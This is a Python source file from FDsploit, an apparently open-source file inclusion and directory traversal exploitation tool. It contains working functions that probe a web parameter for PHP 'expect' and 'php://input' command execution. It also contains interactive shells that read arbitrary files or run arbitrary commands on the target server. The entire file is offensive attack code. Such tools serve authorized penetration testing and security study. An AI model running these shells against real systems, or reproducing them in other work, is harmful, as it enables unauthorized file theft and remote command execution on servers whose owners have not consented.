#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = 'Christophoros Petrou (game0ver)'
__description__ = 'FDsploit.py: File inclusion & directory traversal fuzzer/enumeration & exploitation framework'
__version__     = '1.2'

import sys
import importlib
importlib.reload(sys)
from core.utils import *
from core.colors import *
warnings.filterwarnings("ignore")


# make it also return a code positive/negative
def test_php_expect(command, verb, url, param, cookie, proxy, parameters=None):
    print('\n{}[*]{} Trying to execute commands with "expect"...'.format(BT, S))
    if verb == "GET":
        ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
        ans2 = req(verb, inject(url, param, php_expect(command)), cookie, proxy)
    else: # POST request
        parameters[param] = 'COMMAND'
        ans1 = req(verb, url, cookie, proxy, parameters)
        parameters[param] = php_expect(command)
        ans2 = req(verb, url, cookie, proxy, parameters)
    if hashpage(ans1.text) != hashpage(ans2.text):
        ret(.1)
        print("{0}[+]{1} It's seems possible to be able to execute commands with 'expect'!".format(FG,S))
        return 1
    else:
        ret(.1)
        print("{0}[x]{1} It's seems it's NOT possible to execute commands with 'expect'!".format(FR,S))
        return 0


def test_php_input(command, verb, url, param, cookie, proxy):
    if verb == "GET":
        print('{}[*]{} Trying to execute commands with "php://input"...'.format(BT, S))
        ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
        ans2 = req(verb, inject(url, param, 'php://input'), cookie, proxy, raw_data=php_input(command))
        if hashpage(ans1.text) != hashpage(ans2.text):
            ret(.1)
            print("{0}[+]{1} It's seems possible to be able to execute commands with 'php://input'!".format(FG,S))
            return 1
        else:
            ret(.1)
            print("{0}[x]{1} It's seems it's NOT possible to execute commands with 'php://input'!".format(FR,S))
            return 0
    else:
        pass
        return 0


def simple_shell(verb, url, param, cookie, proxy, tchar, b64, uenc, parameters=None):
    """file reading"""
    try:
        initial = lessHTML(req(verb, url, cookie, proxy, parameters).text)
        while True:
            filename = raw_input(BT+FG+'>_: '+S).rstrip()
            if filename:
                if filename == "clear":
                    clear_screen()
                elif filename == "exit":
                    sys.exit(0)
                else:
                    if verb == "GET":
                        res = req(verb, inject(url, param, createQuery(b64, uenc, tchar, 0, filename)), cookie, proxy)
                    else: # POST request
                        parameters[param] = createQuery(b64, uenc, tchar, 0, filename)
                        res = req(verb, url, cookie, proxy, parameters)
                    if res.status_code == 200:
                        content = '\n'.join(line for line in lessHTML(res.text).splitlines() if line not in initial.splitlines())
                        print('{0}\n{1}'.format((FG+'-'+S )* 50, content))
                    else:
                        print('{}[-] No such file!{}\n'.format(FR, S))
    except KeyboardInterrupt:
        sys.exit(0)


def expect_shell(verb, url, param, cookie, proxy, parameters=None):
    """PHP expect based shell...--> command execution"""
    try:
        if test_php_expect('ls', verb, url, param, cookie, proxy, parameters):
            initial = lessHTML(req(verb, url, cookie, proxy, parameters).text)
            while True:
                command = raw_input(BT+FG+'>_: '+S).rstrip()
                if command:
                    if command == "clear":
                        clear_screen()
                    elif command == "exit":
                        sys.exit(0)
                    else:
                        if verb == "GET":
                            res = req(verb, inject(url, param, php_expect(command)), cookie, proxy)
                        else: # POST request
                            parameters[param] = php_expect(command)
                            res = req(verb, url, cookie, proxy, parameters)
                        if res.status_code == 200:
                            content = '\n'.join(line for line in lessHTML(res.text).splitlines() if line not in initial.splitlines())
                            print('{0}\n{1}'.format((FG+'-'+S )* 50, content))
                        else:
                            print('{}[-] Something went wrong!{}\n'.format(FR, S))
        else:
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)


def input_shell(verb, url, param, cookie, proxy):
    """PHP php://input based shell...--> command execution"""
    try:
        if test_php_input('ls', verb, url, param, cookie, proxy):
            initial = lessHTML(req(verb, url, cookie, proxy).text)
            while True:
                command = raw_input(BT+FG+'>_: '+S).rstrip()
                if command:
                    if command == "clear":
                        clear_screen()
                    elif command == "exit":
                        sys.exit(0)
                    else:
                        res = req(verb, inject(url, param, 'php://input'), cookie, proxy, raw_data=php_input(command))
                        if res.status_code == 200:
                            content = '\n'.join(line for line in lessHTML(res.text).splitlines() if line not in initial.splitlines())
                            print('{0}\n{1}'.format((FG+'-'+S )* 50, content))
                        else:
                            print('{}[-] Something went wrong!{}\n'.format(FR, S))
        else:
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)
